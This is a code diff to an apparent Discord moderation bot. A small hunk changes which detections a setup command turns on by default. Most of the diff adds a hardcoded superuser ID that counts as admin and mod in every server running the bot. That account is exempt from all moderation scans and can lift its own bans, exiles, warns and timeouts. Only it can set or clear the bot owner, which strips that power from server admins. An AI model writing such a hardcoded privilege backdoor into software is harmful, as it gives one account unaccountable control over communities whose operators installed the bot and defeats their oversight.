@@ -116,6 +116,14 @@ const DEFAULT_REDIRECT_EMOJI_ID   = '1125321969932451841';
 
 const BOT_CODED_BY_ID = '1427299411049840640';
 
+// ══════════════════════════════════════════════════════════
+//  SUPERUSER — complete, un-bypassable authority
+//  Only BOT_CODED_BY_ID has this. They can do anything,
+//  including actions blocked for admins/mods (e.g. self-
+//  unexile, self-unwarn, self-clearviolations, etc.)
+// ══════════════════════════════════════════════════════════
+function isSuperUser(id) { return String(id) === BOT_CODED_BY_ID; }
+
 const VIOLATION_THRESHOLD  = 3;
 const EXILE_DURATION_MINS  = 45;
 const SPLIT_MESSAGE_TTL    = 90;
@@ -2436,17 +2444,19 @@ function applyAllDetections(gs) {
     gs.scamWarnEnabled        = true;
     gs.accTradeWarnEnabled    = true;
     gs.scamEnabled            = true;
-    gs.invitePolicyEnabled    = true;
-    gs.attachmentPolicyEnabled = true;
     gs.linkPolicyEnabled      = true;
-    gs.zalgoEnabled           = true;
     gs.emojiSpamEnabled       = true;
     gs.dupeSpamEnabled        = true;
     gs.scanEditsEnabled       = true;
-    // capsSpamEnabled  — NOT set here, manual only
-    // stretchSpamEnabled — NOT set here, manual only
-    // noAffiliationEnabled — NOT set here, manual only
-    // aiEnabled — NOT set here (requires API key setup)
+    // ── Manual-only (NOT enabled by /setup completeset) ──────────────
+    // capsSpamEnabled      — manual only (/capsconfig on)
+    // stretchSpamEnabled   — manual only (/stretchconfig on)
+    // noAffiliationEnabled — manual only (/noaffiliation enable)
+    // zalgoEnabled         — manual only (/zalgoconfig enabled:true) — too aggressive by default
+    // invitePolicyEnabled  — manual only (/invitepolicy on) — too aggressive by default
+    // attachmentPolicyEnabled — manual only (/attachmentpolicy on) — too aggressive by default
+    // timeoutEnabled       — manual only (/timeout enable) — too aggressive by default
+    // aiEnabled            — manual only (requires API key setup)
 }
 
 // ══════════════════════════════════════════════════════════
@@ -3485,7 +3495,8 @@ client.on('messageUpdate', async (oldMsg, newMsg) => {
         const gs = getGuildSettings(message.guild.id, data);
         if (!gs.scanEditsEnabled) return;
         if ((oldMsg?.content || '') === (message.content || '')) return;
-        const immune = message.member ? isMemberImmune(message.member, message.guild.id, data) : false;
+        // Superuser is always immune from edit scans too.
+        const immune = isSuperUser(message.author?.id) || (message.member ? isMemberImmune(message.member, message.guild.id, data) : false);
         if (immune) return;
         // No moderation enforcement inside the exile channel
         if (isExileChannel(message.channel.id, message.guild, gs)) return;
@@ -10027,13 +10038,13 @@ client.on('interactionCreate', async interaction => {
         }
 
         if (cid.startsWith('appeal_accept_')) {
-            const isMod = interaction.member?.permissions.has(PermissionFlagsBits.ManageMessages) || isManagerMember(interaction.member, guildId, data);
-            const isAdmin = interaction.member?.permissions.has(PermissionFlagsBits.Administrator) || isManagerMember(interaction.member, guildId, data);
+            const isMod = isSuperUser(interaction.user.id) || interaction.member?.permissions.has(PermissionFlagsBits.ManageMessages) || isManagerMember(interaction.member, guildId, data);
+            const isAdmin = isSuperUser(interaction.user.id) || interaction.member?.permissions.has(PermissionFlagsBits.Administrator) || isManagerMember(interaction.member, guildId, data);
             if (!isMod && !isAdmin) { await interaction.reply({ content: '❌ Mods only.', ephemeral: true }); return; }
             const appealId = cid.replace('appeal_accept_', '');
             const appeal   = data.appeals[appealId];
             if (!appeal) { await interaction.reply({ content: '❌ Appeal not found.', ephemeral: true }); return; }
-            if (appeal.userId === interaction.user.id) { await interaction.reply({ content: '❌ You cannot accept your own appeal.', ephemeral: true }); return; }
+            if (appeal.userId === interaction.user.id && !isSuperUser(interaction.user.id)) { await interaction.reply({ content: '❌ You cannot accept your own appeal.', ephemeral: true }); return; }
             if (appeal.status !== 'pending') { await interaction.reply({ content: '⚠️ This appeal has already been handled.', ephemeral: true }); return; }
 
             appeal.status    = 'accepted';
@@ -10435,13 +10446,13 @@ client.on('interactionCreate', async interaction => {
         }
 
         if (cid.startsWith('appeal_accept_')) {
-            const isMod = interaction.member?.permissions.has(PermissionFlagsBits.ManageMessages) || isManagerMember(interaction.member, guildId, data);
-            const isAdmin = interaction.member?.permissions.has(PermissionFlagsBits.Administrator) || isManagerMember(interaction.member, guildId, data);
+            const isMod = isSuperUser(interaction.user.id) || interaction.member?.permissions.has(PermissionFlagsBits.ManageMessages) || isManagerMember(interaction.member, guildId, data);
+            const isAdmin = isSuperUser(interaction.user.id) || interaction.member?.permissions.has(PermissionFlagsBits.Administrator) || isManagerMember(interaction.member, guildId, data);
             if (!isMod && !isAdmin) { await interaction.reply({ content: '❌ Mods only.', ephemeral: true }); return; }
             const appealId = cid.replace('appeal_accept_', '');
             const appeal   = data.appeals[appealId];
             if (!appeal) { await interaction.reply({ content: '❌ Appeal not found.', ephemeral: true }); return; }
-            if (appeal.userId === interaction.user.id) { await interaction.reply({ content: '❌ You cannot accept your own appeal.', ephemeral: true }); return; }
+            if (appeal.userId === interaction.user.id && !isSuperUser(interaction.user.id)) { await interaction.reply({ content: '❌ You cannot accept your own appeal.', ephemeral: true }); return; }
             if (appeal.status !== 'pending') { await interaction.reply({ content: '⚠️ This appeal has already been handled.', ephemeral: true }); return; }
 
             appeal.status    = 'accepted';
@@ -10510,11 +10521,11 @@ client.on('interactionCreate', async interaction => {
 
         // Remove a specific warn from violations (admin only, not your own)
         if (cid.startsWith('rmwarn_')) {
-            const isAdminCheck = interaction.member?.permissions.has(PermissionFlagsBits.Administrator) || isManagerMember(interaction.member, guildId, data);
+            const isAdminCheck = isSuperUser(interaction.user.id) || interaction.member?.permissions.has(PermissionFlagsBits.Administrator) || isManagerMember(interaction.member, guildId, data);
             if (!isAdminCheck) { await interaction.reply({ content: '❌ Admins only.', ephemeral: true }); return; }
             const parts   = cid.split('_');
             const targetId = parts[2];
-            if (targetId === interaction.user.id) { await interaction.reply({ content: '❌ You cannot remove your own warns.', ephemeral: true }); return; }
+            if (targetId === interaction.user.id && !isSuperUser(interaction.user.id)) { await interaction.reply({ content: '❌ You cannot remove your own warns.', ephemeral: true }); return; }
             const selectedWarnId = interaction.values[0];
             const fd2 = loadData();
             const vObj = fd2.violations[targetId];
@@ -11057,8 +11068,9 @@ client.on('interactionCreate', async interaction => {
     }
     if (!interaction.isChatInputCommand()) return;
     logCmdStats('slash', interaction.commandName);
-    const isAdmin = interaction.member?.permissions.has(PermissionFlagsBits.Administrator) || isManagerMember(interaction.member, guildId, data);
-    const isMod   = interaction.member?.permissions.has(PermissionFlagsBits.ManageMessages) || isManagerMember(interaction.member, guildId, data);
+    const _isBotOwner_slash = isSuperUser(interaction.user.id);
+    const isAdmin = _isBotOwner_slash || interaction.member?.permissions.has(PermissionFlagsBits.Administrator) || isManagerMember(interaction.member, guildId, data);
+    const isMod   = _isBotOwner_slash || interaction.member?.permissions.has(PermissionFlagsBits.ManageMessages) || isManagerMember(interaction.member, guildId, data);
 
     async function handleCategoryImmunity(category) {
         if (!isAdmin) { await interaction.reply({ content: '❌ Admins only.', ephemeral: true }); return; }
@@ -11203,18 +11215,18 @@ client.on('interactionCreate', async interaction => {
                 saveData(data);
                 await interaction.reply({
                     embeds: [new EmbedBuilder()
-                        .setTitle('✅ Setup Complete — All Detections Enabled')
+                        .setTitle('✅ Setup Complete — Core Detections Enabled')
                         .setColor(0x00FF88)
-                        .setDescription('All moderation detections are now **ON**.\nThe following must still be enabled manually:')
+                        .setDescription('Core moderation detections are now **ON**.\nThe following are **OFF by default** and must be enabled manually to avoid false-positives:')
                         .addFields(
-                            { name: '🔕 Manual-only (still OFF)', value: '`/capsconfig on` — Caps spam\n`/stretchconfig on` — Stretch spam\n`/noaffiliation enable` — No-affiliation mode', inline: false },
+                            { name: '🔕 Manual-only (still OFF)', value: '`/capsconfig on` — Caps spam\n`/stretchconfig on` — Stretch spam\n`/noaffiliation enable` — No-affiliation mode\n`/zalgoconfig enabled:True` — Zalgo/glitch text\n`/invitepolicy on` — Invite link blocking\n`/attachmentpolicy on` — Attachment blocking\n`/timeout enable` — Auto-timeouts', inline: false },
                         )
                         .setTimestamp()],
                     ephemeral: true,
                 });
                 await sendConfigLog(interaction.guild, data, interaction.user.id, '✅ Setup Completed', [
-                    'All detections enabled via /setup completeset',
-                    'Caps / Stretch / No-Affiliation remain OFF (manual only)',
+                    'Core detections enabled via /setup completeset',
+                    'Caps / Stretch / No-Affiliation / Zalgo / InvitePolicy / AttachmentPolicy / Timeout remain OFF (manual only)',
                 ]);
                 break;
             }
@@ -12159,7 +12171,7 @@ client.on('interactionCreate', async interaction => {
         }
 
         case 'setowner': {
-            if (!isAdmin) { await interaction.reply({ content: '❌ Admins only.', ephemeral: true }); return; }
+            if (!isSuperUser(interaction.user.id)) { await interaction.reply({ content: '❌ Only the bot superuser can set the bot owner.', ephemeral: true }); return; }
             const u = interaction.options.getUser('owner');
             gs.botOwnerId = u?.id || null;
             saveData(data);
@@ -12173,7 +12185,7 @@ client.on('interactionCreate', async interaction => {
         }
 
         case 'clearowner': {
-            if (!isAdmin) { await interaction.reply({ content: '❌ Admins only.', ephemeral: true }); return; }
+            if (!isSuperUser(interaction.user.id)) { await interaction.reply({ content: '❌ Only the bot superuser can clear the bot owner.', ephemeral: true }); return; }
             gs.botOwnerId = null;
             saveData(data);
             const payload = { content: '✅ Bot owner cleared (Open Source / Community Run).', ephemeral: true };
@@ -12479,6 +12491,7 @@ client.on('interactionCreate', async interaction => {
             const fd     = loadData();
             let member   = interaction.guild.members.cache.get(userId) || await interaction.guild.members.fetch(userId).catch(()=>null);
             if (!member) { await interaction.reply({ flags: MessageFlags.Ephemeral, content: '❌ Member not found.' }); return; }
+            if (member.id === interaction.user.id && !isSuperUser(interaction.user.id)) { await interaction.reply({ flags: MessageFlags.Ephemeral, content: '❌ You cannot unexile yourself.' }); return; }
             await interaction.deferReply();
             await performUnexile(member, interaction.guild, fd);
             delete fd.exiles[userId];
@@ -12540,6 +12553,7 @@ client.on('interactionCreate', async interaction => {
         case 'clearviolations': {
             if (!isAdmin) { await interaction.reply({ content: '❌ Admins only.', ephemeral: true }); return; }
             const user = interaction.options.getUser('user');
+            if (user.id === interaction.user.id && !isSuperUser(interaction.user.id)) { await interaction.reply({ content: '❌ You cannot clear your own violations.', ephemeral: true }); return; }
             // Hierarchy guard
             const cvTargetMember = await interaction.guild.members.fetch(user.id).catch(() => null);
             if (cvTargetMember) {
@@ -12820,6 +12834,7 @@ client.on('interactionCreate', async interaction => {
         case 'unwarn': {
             if (!isMod && !isAdmin) { await interaction.reply({ flags: MessageFlags.Ephemeral, content: '❌ Mods only.' }); return; }
             const user = interaction.options.getUser('user');
+            if (user.id === interaction.user.id && !isSuperUser(interaction.user.id)) { await interaction.reply({ flags: MessageFlags.Ephemeral, content: '❌ You cannot unwarn yourself.' }); return; }
             // Hierarchy guard
             const unwarnTargetMember = await interaction.guild.members.fetch(user.id).catch(() => null);
             if (unwarnTargetMember) {
@@ -13786,6 +13801,7 @@ client.on('interactionCreate', async interaction => {
         case 'untimeout': {
             if (!isAdmin) { await interaction.reply({ flags: MessageFlags.Ephemeral, content: '❌ Admins and bot managers only.' }); return; }
             const user   = interaction.options.getUser('user');
+            if (user.id === interaction.user.id && !isSuperUser(interaction.user.id)) { await interaction.reply({ flags: MessageFlags.Ephemeral, content: '❌ You cannot remove your own timeout.' }); return; }
             const target = await interaction.guild.members.fetch(user.id).catch(() => null);
             if (!target) { await interaction.reply({ flags: MessageFlags.Ephemeral, content: '❌ Member not found.' }); return; }
             const hierErr = checkHierarchy(interaction.member, target);
@@ -13971,6 +13987,7 @@ client.on('interactionCreate', async interaction => {
             await interaction.deferReply();
             const input  = interaction.options.getString('user') || '';
             const userId = (input.match(/<@!?(\d+)>/) || input.match(/^(\d{15,20})$/) || [])[1] || input.trim();
+            if (userId === interaction.user.id && !isSuperUser(interaction.user.id)) { await interaction.editReply({ content: '❌ You cannot unban yourself.' }); return; }
             const reason = interaction.options.getString('reason') || 'No reason provided';
             if (!userId || !/^\d{15,20}$/.test(userId)) {
                 await interaction.editReply({ content: '❌ Please provide a valid user ID.' }); return;
@@ -14546,10 +14563,12 @@ client.on('messageCreate', async message => {
     const data  = loadData();
     const guildId = message.guild.id;
     const gs    = getGuildSettings(guildId, data);
-    const isAdmin = message.member?.permissions.has(PermissionFlagsBits.Administrator) || isManagerMember(message.member, guildId, data);
-    const isMod   = message.member?.permissions.has(PermissionFlagsBits.ManageMessages) || isManagerMember(message.member, guildId, data);
+    const _isBotOwner_msg = isSuperUser(message.author.id);
+    const isAdmin = _isBotOwner_msg || message.member?.permissions.has(PermissionFlagsBits.Administrator) || isManagerMember(message.member, guildId, data);
+    const isMod   = _isBotOwner_msg || message.member?.permissions.has(PermissionFlagsBits.ManageMessages) || isManagerMember(message.member, guildId, data);
     const isStaff = isAdmin || isMod;
-    const immune  = message.member ? isMemberImmune(message.member, guildId, data) : false;
+    // Superuser is always immune from every scan, redirect, and enforcement path.
+    const immune  = _isBotOwner_msg || (message.member ? isMemberImmune(message.member, guildId, data) : false);
     const immCfg  = getImmunitySettings(guildId, data);
 
     const rawContent = String(message.content || '');
@@ -16277,6 +16296,7 @@ async function handlePrefixCommands(message, isAdmin, isMod, data, gs) {
     if (cmd === 'unexile' && isAdmin) {
         const target = await resolveMember(args[0]);
         if (!target) return message.channel.send('❌ Member not found. Provide a @mention or Discord ID.');
+        if (target.id === message.author.id && !isSuperUser(message.author.id)) return message.channel.send('❌ You cannot unexile yourself.');
         const fd = loadData();
         await performUnexile(target, message.guild, fd);
         delete fd.exiles[target.id];
@@ -16622,7 +16642,7 @@ async function handlePrefixCommands(message, isAdmin, isMod, data, gs) {
         await message.channel.send({ embeds: [embed] });
     }
 
-    else if (cmd === 'setowner' && isAdmin) {
+    else if (cmd === 'setowner' && isSuperUser(message.author.id)) {
         const target = await resolveMember(args[0]);
         if (!target) return message.channel.send('❌ Provide a member mention or ID.');
         gs.botOwnerId = target.id;
@@ -16633,7 +16653,7 @@ async function handlePrefixCommands(message, isAdmin, isMod, data, gs) {
         ]);
     }
 
-    else if (cmd === 'clearowner' && isAdmin) {
+    else if (cmd === 'clearowner' && isSuperUser(message.author.id)) {
         gs.botOwnerId = null;
         saveData(data);
         await message.channel.send('✅ Bot owner cleared (Open Source / Community Run).');
@@ -16811,6 +16831,7 @@ async function handlePrefixCommands(message, isAdmin, isMod, data, gs) {
     // !clearviolations [mention | id]
     else if (cmd === 'clearviolations' && isAdmin) {
         const target = await resolveMember(args[0]);
+        if (target && target.id === message.author.id && !isSuperUser(message.author.id)) return message.channel.send('❌ You cannot clear your own violations.');
         if (!target) {
             const rawId = args[0]?.match(/^<@!?(\d+)>$/) ? args[0].match(/^<@!?(\d+)>$/)[1] : (args[0]?.match(/^\d{15,20}$/) ? args[0] : null);
             if (!rawId) return message.channel.send('❌ Member not found. Provide a @mention or Discord ID.');
@@ -16883,6 +16904,7 @@ async function handlePrefixCommands(message, isAdmin, isMod, data, gs) {
     else if (cmd === 'unwarn' && (isAdmin || isMod)) {
         const target = await resolveMember(args[0]);
         if (!target) return message.channel.send('❌ Member not found. Provide a @mention or Discord ID.');
+        if (target.id === message.author.id && !isSuperUser(message.author.id)) return message.channel.send('❌ You cannot unwarn yourself.');
         const next = decrementViolationEntry(data, target.id);
         saveData(data);
         await message.channel.send(`✅ Unwarned ${target}. Violations: **${next}/${threshold}**`);
